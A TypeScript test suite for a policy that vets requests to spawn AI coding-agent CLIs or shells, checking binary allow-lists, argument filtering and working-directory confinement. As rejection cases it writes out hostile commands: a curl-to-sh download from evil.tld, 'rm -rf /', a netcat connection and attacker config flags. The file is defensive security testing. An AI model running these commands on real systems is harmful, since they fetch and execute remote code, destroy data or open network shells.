import { describe, it, expect } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import { buildUserPath, resolveCommandOnPath } from "../shell-env";
import { resolveAgentCommandOnPath } from "../agent-cli-resolution";
import {
  resolveSpawnPlan,
  SpawnPolicyError,
  type SpawnRequest,
  type SpawnPolicyDeps,
  type SpawnPolicyErrorCode,
} from "../pty-spawn-policy";

const PROJECT_ROOT = "/Users/me/code/myproject";

function writeExecutable(file: string, contents = "#!/bin/sh\nexit 0\n"): void {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, contents, "utf8");
  fs.chmodSync(file, 0o755);
}

function depsFor(overrides: Partial<SpawnPolicyDeps> = {}): SpawnPolicyDeps {
  return {
    cwdExists: () => true,
    realpath: (p) => p,
    projectRoots: () => [PROJECT_ROOT],
    resolveCommand: (name) => `/usr/local/bin/${name}`,
    resolveShell: () => ({
      shell: "/bin/zsh",
      shellArgs: (cmd) => (cmd ? ["-l", "-c", cmd] : ["-l"]),
    }),
    ...overrides,
  };
}

function spawnReq(overrides: Record<string, unknown> = {}): SpawnRequest {
  return {
    taskId: "t1",
    cwd: PROJECT_ROOT,
    command: "claude --resume 00000000-0000-4000-8000-000000000000",
    agent: "claude-code",
    ...overrides,
  } as SpawnRequest;
}

function expectRejected(
  req: unknown,
  deps: SpawnPolicyDeps,
  expectedCode: SpawnPolicyErrorCode,
): void {
  let thrown: unknown;
  try {
    resolveSpawnPlan(req as SpawnRequest, deps);
  } catch (err) {
    thrown = err;
  }
  if (!(thrown instanceof SpawnPolicyError)) {
    throw new Error(
      `expected SpawnPolicyError(${expectedCode}), got: ${thrown === undefined ? "no throw" : String(thrown)}`,
    );
  }
  expect(thrown.code).toBe(expectedCode);
}

describe("resolveSpawnPlan — agent allow-list", () => {
  it("accepts a claude-code spawn at the project root and returns argv directly", () => {
    const plan = resolveSpawnPlan(spawnReq(), depsFor());
    expect(plan.mode).toBe("agent");
    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.binary).toBe("/usr/local/bin/claude");
    expect(plan.argv).toEqual(["--resume", "00000000-0000-4000-8000-000000000000"]);
  });

  it("maps codex agent to the codex binary", () => {
    const plan = resolveSpawnPlan(
      spawnReq({ agent: "codex", command: "codex" }),
      depsFor(),
    );
    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.binary).toBe("/usr/local/bin/codex");
    expect(plan.argv).toEqual([]);
  });

  it("passes Codex managed-hook flags as direct argv", () => {
    const plan = resolveSpawnPlan(
      spawnReq({ agent: "codex", command: "codex --enable hooks" }),
      depsFor(),
    );
    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.binary).toBe("/usr/local/bin/codex");
    expect(plan.argv).toEqual(["--enable", "hooks"]);
    expect(plan.spawnTarget).toBe("/usr/local/bin/codex");
    expect(plan.spawnArgs).toEqual(["--enable", "hooks"]);
  });

  it("wraps Windows command shims through cmd.exe after argv validation", () => {
    const plan = resolveSpawnPlan(
      spawnReq({ agent: "codex", command: "codex --enable hooks" }),
      depsFor({
        platform: "win32",
        resolveCommand: () => "C:\\Users\\me\\AppData\\Roaming\\npm\\codex.cmd",
        windowsSystemRoot: () => "C:\\Windows",
      }),
    );

    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.binary).toBe("C:\\Users\\me\\AppData\\Roaming\\npm\\codex.cmd");
    expect(plan.argv).toEqual(["--enable", "hooks"]);
    expect(plan.spawnTarget).toBe("C:\\Windows\\System32\\cmd.exe");
    expect(plan.spawnArgs).toBe(
      '/d /s /c ""C:\\Users\\me\\AppData\\Roaming\\npm\\codex.cmd" "--enable" "hooks""',
    );
  });

  it("maps cursor-cli agent to the cursor-agent binary", () => {
    const plan = resolveSpawnPlan(
      spawnReq({ agent: "cursor-cli", command: "cursor-agent" }),
      depsFor(),
    );
    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.binary).toBe("/usr/local/bin/cursor-agent");
    expect(plan.argv).toEqual([]);
  });

  it("resolves cursor-cli via the official agent binary when cursor-agent is absent", () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "mc-cursor-spawn-"));
    const binDir = path.join(root, "User", ".local", "bin");
    writeExecutable(path.join(binDir, "agent.exe"), "@echo off\r\n");

    const env = {
      Path: binDir,
      PATHEXT: ".COM;.EXE;.BAT;.CMD",
    };

    const plan = resolveSpawnPlan(
      spawnReq({ agent: "cursor-cli", command: "cursor-agent" }),
      depsFor({
        platform: "win32",
        resolveCommand: (name) => resolveAgentCommandOnPath(name, env, "win32"),
      }),
    );

    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.binary).toBe(path.join(binDir, "agent.exe"));
  });

  it("maps opencode agent to the opencode binary", () => {
    const plan = resolveSpawnPlan(
      spawnReq({ agent: "opencode", command: "opencode" }),
      depsFor(),
    );
    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.binary).toBe("/usr/local/bin/opencode");
    expect(plan.argv).toEqual([]);
  });

  it("rejects OpenCode session ids that are not ses_* values", () => {
    expectRejected(
      spawnReq({
        agent: "opencode",
        command: "opencode --session 00000000-0000-4000-8000-000000000000",
      }),
      depsFor(),
      "agent-arg-not-allowed",
    );
  });

  it("rejects an unknown agent slug", () => {
    expectRejected(
      spawnReq({ agent: "evil-cli", command: "evil-cli" }),
      depsFor(),
      "unknown-agent",
    );
  });

  it("rejects an agent spawn whose command's first token is not the agent binary (the RCE primitive)", () => {
    // This is the exact bug-05 attack: a briefly-compromised renderer setting
    // `agent: "claude-code"` but `command: "curl evil | sh"` to slip a foreign
    // binary past the loose pre-fix check.
    expectRejected(
      spawnReq({ agent: "claude-code", command: "curl https://evil.tld/x.sh | sh" }),
      depsFor(),
      "command-not-on-allowlist",
    );
  });

  it("rejects an agent spawn whose command is an absolute path to a foreign binary", () => {
    expectRejected(
      spawnReq({ agent: "claude-code", command: "/bin/bash" }),
      depsFor(),
      "command-not-on-allowlist",
    );
  });

  it("rejects shell metacharacters in agent args", () => {
    // No shell to re-parse them, but a `;` or `$()` in an arg is never a
    // legitimate agent invocation — it's the polished version of the same RCE.
    for (const arg of ["; rm -rf /", "$(curl evil.sh)", "`whoami`", "&& nc evil 1337"]) {
      expectRejected(
        spawnReq({ agent: "claude-code", command: "claude", args: ["--resume", arg] }),
        depsFor(),
        "shell-meta-in-args",
      );
    }
  });

  it("rejects agent flags that load attacker-controlled config or commands", () => {
    for (const req of [
      spawnReq({ agent: "claude-code", command: "claude --mcp-config /tmp/evil.json" }),
      spawnReq({ agent: "claude-code", command: "claude --mcp-server evil" }),
      spawnReq({ agent: "codex", command: "codex --config-file /tmp/evil.toml" }),
      spawnReq({ agent: "cursor-cli", command: "cursor-agent --config /tmp/evil.json" }),
      spawnReq({ agent: "opencode", command: "opencode --config /tmp/evil.json" }),
    ]) {
      expectRejected(req, depsFor(), "agent-arg-not-allowed");
    }
  });

  it("rejects permission-bypass flags without explicit opt-in", () => {
    for (const req of [
      spawnReq({ agent: "claude-code", command: "claude --dangerously-skip-permissions" }),
      spawnReq({ agent: "codex", command: "codex --yolo" }),
      spawnReq({ agent: "cursor-cli", command: "cursor-agent --force" }),
    ]) {
      expectRejected(req, depsFor(), "agent-arg-not-allowed");
    }
  });

  it("accepts permission-bypass flags with explicit opt-in", () => {
    const cases: Array<{ req: SpawnRequest; argv: string[] }> = [
      {
        req: spawnReq({
          agent: "claude-code",
          command:
            "claude --resume 00000000-0000-4000-8000-000000000000 --dangerously-skip-permissions",
          dangerouslySkipPermissions: true,
        }),
        argv: [
          "--resume",
          "00000000-0000-4000-8000-000000000000",
          "--dangerously-skip-permissions",
        ],
      },
      {
        req: spawnReq({
          agent: "codex",
          command: "codex --enable hooks --yolo",
          dangerouslySkipPermissions: true,
        }),
        argv: ["--enable", "hooks", "--yolo"],
      },
      {
        req: spawnReq({
          agent: "codex",
          command:
            "codex resume 019d7a0f-432a-7fa1-a821-b7841f983967 --enable hooks --yolo",
          dangerouslySkipPermissions: true,
        }),
        argv: [
          "resume",
          "019d7a0f-432a-7fa1-a821-b7841f983967",
          "--enable",
          "hooks",
          "--yolo",
        ],
      },
      {
        req: spawnReq({
          agent: "cursor-cli",
          command: "cursor-agent --force",
          dangerouslySkipPermissions: true,
        }),
        argv: ["--force"],
      },
      {
        req: spawnReq({
          agent: "cursor-cli",
          command:
            "cursor-agent --resume 00000000-0000-4000-8000-000000000000 --force",
          dangerouslySkipPermissions: true,
        }),
        argv: ["--resume", "00000000-0000-4000-8000-000000000000", "--force"],
      },
      {
        req: spawnReq({
          agent: "opencode",
          command: "opencode --session ses_3cf7dd8d4ffeUPfENpVxfFojZ2",
        }),
        argv: ["--session", "ses_3cf7dd8d4ffeUPfENpVxfFojZ2"],
      },
    ];

    for (const { req, argv } of cases) {
      const plan = resolveSpawnPlan(req, depsFor());
      if (plan.mode !== "agent") throw new Error("wrong mode");
      expect(plan.argv).toEqual(argv);
    }
  });

  it("rejects unexpected positional args after allowed agent flags", () => {
    expectRejected(
      spawnReq({ agent: "codex", command: "codex --enable hooks exec bad" }),
      depsFor(),
      "agent-arg-not-allowed",
    );
  });

  it("rejects unapproved Codex feature values", () => {
    expectRejected(
      spawnReq({ agent: "codex", command: "codex --enable mcp" }),
      depsFor(),
      "agent-arg-not-allowed",
    );
  });

  it("rejects an empty agent command", () => {
    expectRejected(
      spawnReq({ agent: "claude-code", command: "" }),
      depsFor(),
      "empty-command",
    );
  });

  it("rejects when the agent binary cannot be found on PATH", () => {
    expectRejected(spawnReq(), depsFor({ resolveCommand: () => null }), "binary-not-found");
  });

  it("merges extra args after command-tokenized argv (and still checks them)", () => {
    const plan = resolveSpawnPlan(
      spawnReq({ command: "claude --bare", args: ["--resume", "X"] }),
      depsFor(),
    );
    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.argv).toEqual(["--bare", "--resume", "X"]);
  });

  it("accepts a claude-code --model with an allow-listed alias", () => {
    for (const model of ["opus", "sonnet", "haiku"]) {
      const plan = resolveSpawnPlan(
        spawnReq({ agent: "claude-code", command: "claude", args: ["--model", model] }),
        depsFor(),
      );
      if (plan.mode !== "agent") throw new Error("wrong mode");
      expect(plan.argv).toEqual(["--model", model]);
    }
  });

  it("rejects a claude-code --model value outside the allow-list", () => {
    for (const model of ["gpt-4", "claude-opus-4-8", "opus-extra"]) {
      expectRejected(
        spawnReq({ agent: "claude-code", command: "claude", args: ["--model", model] }),
        depsFor(),
        "agent-arg-not-allowed",
      );
    }
  });

  it("ignores initialInput — it is stdin data, never part of the spawn command", () => {
    // initialInput is written to the PTY post-spawn (like a user typing), so it
    // bypasses the argv allow-list entirely; even shell metacharacters in it are
    // harmless because they're never parsed as a command.
    const plan = resolveSpawnPlan(
      spawnReq({
        agent: "claude-code",
        command: "claude",
        initialInput: "improve the seo; rm -rf /",
      }),
      depsFor(),
    );
    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.argv).toEqual([]);
  });
});

describe("resolveSpawnPlan — shell env integration", () => {
  it("chooses the active POSIX Codex from PATH over a stale guessed NVM install", () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "mc-codex-launch-"));
    const home = path.join(root, "home");
    const herdNvmDir = path.join(home, "Library", "Application Support", "Herd", "config", "nvm");
    const activeBin = path.join(herdNvmDir, "versions", "node", "v24.15.0", "bin");
    const staleBin = path.join(herdNvmDir, "versions", "node", "v22.21.1", "bin");
    const activeCodex = path.join(activeBin, "codex");

    writeExecutable(activeCodex);
    writeExecutable(path.join(staleBin, "codex"));

    const env = {
      PATH: buildUserPath(activeBin, {
        platform: "darwin",
        homeDir: home,
        env: { NVM_DIR: herdNvmDir },
      }),
    };

    const plan = resolveSpawnPlan(
      spawnReq({ agent: "codex", command: "codex --enable hooks" }),
      depsFor({
        resolveCommand: (name) => resolveCommandOnPath(name, env, "darwin"),
      }),
    );

    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.binary).toBe(activeCodex);
    expect(plan.binary).toContain("Application Support");
    expect(plan.argv).toEqual(["--enable", "hooks"]);
  });

  const posixIt = process.platform === "win32" ? it.skip : it;
  posixIt("executes the resolved POSIX Codex shim with managed-hook argv", () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "mc-codex-exec-"));
    const home = path.join(root, "home");
    const nvmDir = path.join(home, ".nvm");
    const activeBin = path.join(nvmDir, "versions", "node", "v24.15.0", "bin");
    const staleBin = path.join(nvmDir, "versions", "node", "v22.21.1", "bin");
    const activeCodex = path.join(activeBin, "codex");

    writeExecutable(
      activeCodex,
      [
        "#!/bin/sh",
        'if [ "$1" = "--enable" ] && [ "$2" = "hooks" ]; then',
        '  printf "active codex\\n"',
        "  exit 0",
        "fi",
        'printf "bad argv: %s\\n" "$*" >&2',
        "exit 13",
        "",
      ].join("\n"),
    );
    writeExecutable(
      path.join(staleBin, "codex"),
      '#!/bin/sh\nprintf "Unknown feature flag: hooks\\n" >&2\nexit 42\n',
    );

    const env = {
      PATH: buildUserPath(activeBin, {
        platform: "darwin",
        homeDir: home,
        env: { NVM_DIR: nvmDir },
      }),
    };
    const plan = resolveSpawnPlan(
      spawnReq({ agent: "codex", command: "codex --enable hooks" }),
      depsFor({
        resolveCommand: (name) => resolveCommandOnPath(name, env, "darwin"),
      }),
    );

    if (plan.mode !== "agent") throw new Error("wrong mode");
    const result = spawnSync(plan.binary, plan.argv, { encoding: "utf8" });
    expect(result.status).toBe(0);
    expect(result.stdout).toContain("active codex");
    expect(result.stderr).not.toContain("Unknown feature flag");
  });
});

describe("resolveSpawnPlan — shell terminals", () => {
  it("requires the explicit shell:true flag when no agent is set", () => {
    expectRejected(
      { taskId: "t", cwd: PROJECT_ROOT, command: "pnpm dev" },
      depsFor(),
      "missing-agent-or-shell-flag",
    );
  });

  it("accepts an opted-in user-shell spawn at the project root", () => {
    const plan = resolveSpawnPlan(
      { taskId: "t", cwd: PROJECT_ROOT, command: "pnpm dev", shell: true },
      depsFor(),
    );
    expect(plan.mode).toBe("shell");
    if (plan.mode !== "shell") throw new Error("wrong mode");
    expect(plan.shellPath).toBe("/bin/zsh");
    expect(plan.shellArgs).toEqual(["-l", "-c", "pnpm dev"]);
  });

  it("accepts an empty command in shell mode (just open the shell prompt)", () => {
    const plan = resolveSpawnPlan(
      { taskId: "t", cwd: PROJECT_ROOT, command: "", shell: true },
      depsFor(),
    );
    if (plan.mode !== "shell") throw new Error("wrong mode");
    expect(plan.shellArgs).toEqual(["-l"]);
  });

  it("rejects when both agent and shell:true are set", () => {
    expectRejected(
      { taskId: "t", cwd: PROJECT_ROOT, command: "claude", agent: "claude-code", shell: true },
      depsFor(),
      "shell-with-agent",
    );
  });
});

describe("resolveSpawnPlan — cwd confinement", () => {
  it("accepts the project root itself", () => {
    expect(() =>
      resolveSpawnPlan(spawnReq({ cwd: PROJECT_ROOT }), depsFor()),
    ).not.toThrow();
  });

  it("accepts a subdirectory of a project root", () => {
    expect(() =>
      resolveSpawnPlan(
        spawnReq({ cwd: path.join(PROJECT_ROOT, "packages", "core") }),
        depsFor(),
      ),
    ).not.toThrow();
  });

  it("rejects a cwd outside every registered project root (the cross-project escape)", () => {
    expectRejected(
      spawnReq({ cwd: "/tmp/elsewhere" }),
      depsFor(),
      "cwd-outside-project-roots",
    );
  });

  it("rejects /etc, /, and other dangerous absolute paths", () => {
    for (const cwd of ["/", "/etc", "/usr/local"]) {
      expectRejected(spawnReq({ cwd }), depsFor(), "cwd-outside-project-roots");
    }
  });

  it("rejects a path that's a sibling-prefix of a project root (no string-startsWith escape)", () => {
    // Without `path.sep`-aware comparison, "/Users/me/code/myproject-evil"
    // startsWith "/Users/me/code/myproject" → true. Confirm the policy uses
    // separator-aware matching so a sibling can't impersonate a project root.
    expectRejected(
      spawnReq({ cwd: `${PROJECT_ROOT}-evil` }),
      depsFor({ projectRoots: () => [PROJECT_ROOT] }),
      "cwd-outside-project-roots",
    );
  });

  it("realpaths both sides so a symlinked cwd can't escape its project", () => {
    // cwd is a symlink that resolves OUTSIDE every project root. The pre-fix
    // handler would have accepted it because the literal string is "inside"; a
    // realpath-aware check catches the escape.
    expectRejected(
      spawnReq({ cwd: path.join(PROJECT_ROOT, "evil-link") }),
      depsFor({
        realpath: (p) =>
          p === path.join(PROJECT_ROOT, "evil-link") ? "/etc" : p,
      }),
      "cwd-outside-project-roots",
    );
  });

  it("rejects when the cwd directory does not exist or is not readable", () => {
    expectRejected(spawnReq(), depsFor({ cwdExists: () => false }), "invalid-cwd");
  });

  it("rejects empty cwd", () => {
    expectRejected(spawnReq({ cwd: "" }), depsFor(), "invalid-cwd");
  });

  it("rejects when there are no registered project roots", () => {
    expectRejected(spawnReq(), depsFor({ projectRoots: () => [] }), "cwd-outside-project-roots");
  });
});

describe("resolveSpawnPlan — home shell roots (dashboard home terminals)", () => {
  const HOME_DIR = "/Users/me";

  it("accepts a shell terminal started in an allowed home root", () => {
    const plan = resolveSpawnPlan(
      { taskId: "t", cwd: HOME_DIR, command: "", shell: true, home: true },
      depsFor({ homeShellRoots: () => [HOME_DIR] }),
    );
    expect(plan.mode).toBe("shell");
    if (plan.mode !== "shell") throw new Error("wrong mode");
    expect(plan.cwd).toBe(HOME_DIR);
  });

  it("accepts a subdirectory of the home root", () => {
    expect(() =>
      resolveSpawnPlan(
        { taskId: "t", cwd: path.join(HOME_DIR, "Downloads"), command: "", shell: true, home: true },
        depsFor({ homeShellRoots: () => [HOME_DIR] }),
      ),
    ).not.toThrow();
  });

  it("rejects the home dir when no homeShellRoots are provided", () => {
    // The allowance is opt-in: without homeShellRoots a shell at ~ is still
    // confined to project roots, exactly like before this feature.
    expectRejected(
      { taskId: "t", cwd: HOME_DIR, command: "", shell: true },
      depsFor(),
      "cwd-outside-project-roots",
    );
  });

  it("does NOT extend the home allowance to agent spawns", () => {
    // homeShellRoots is shell-only; an agent must never start outside a project
    // root even when a home root is configured.
    expectRejected(
      spawnReq({ cwd: HOME_DIR }),
      depsFor({ homeShellRoots: () => [HOME_DIR] }),
      "cwd-outside-project-roots",
    );
  });

  it("realpaths home roots so a symlinked home cwd can't escape", () => {
    expectRejected(
      { taskId: "t", cwd: path.join(HOME_DIR, "evil-link"), command: "", shell: true, home: true },
      depsFor({
        homeShellRoots: () => [HOME_DIR],
        realpath: (p) => (p === path.join(HOME_DIR, "evil-link") ? "/etc" : p),
      }),
      "cwd-outside-project-roots",
    );
  });
});

describe("SpawnPolicyError surfaces typed codes", () => {
  it("attaches a stable .code field for callers to switch on", () => {
    try {
      resolveSpawnPlan(spawnReq({ agent: "claude-code", command: "foo" }), depsFor());
      throw new Error("expected throw");
    } catch (err) {
      expect(err).toBeInstanceOf(SpawnPolicyError);
      expect((err as SpawnPolicyError).code).toBe("command-not-on-allowlist");
    }
  });

  it("does not echo rejected request input in user-facing messages", () => {
    const rawCwd = `${PROJECT_ROOT}\x1b[2J`;
    try {
      resolveSpawnPlan(spawnReq({ cwd: rawCwd }), depsFor({ cwdExists: () => false }));
      throw new Error("expected throw");
    } catch (err) {
      expect(err).toBeInstanceOf(SpawnPolicyError);
      expect((err as SpawnPolicyError).message).not.toContain(PROJECT_ROOT);
      expect((err as SpawnPolicyError).message).not.toContain("\x1b");
    }

    try {
      resolveSpawnPlan(
        spawnReq({ command: "claude", args: ["--resume", "\x1b[2Jfake-output"] }),
        depsFor(),
      );
      throw new Error("expected throw");
    } catch (err) {
      expect(err).toBeInstanceOf(SpawnPolicyError);
      expect((err as SpawnPolicyError).message).not.toContain("fake-output");
      expect((err as SpawnPolicyError).message).not.toContain("\x1b");
    }
  });
});
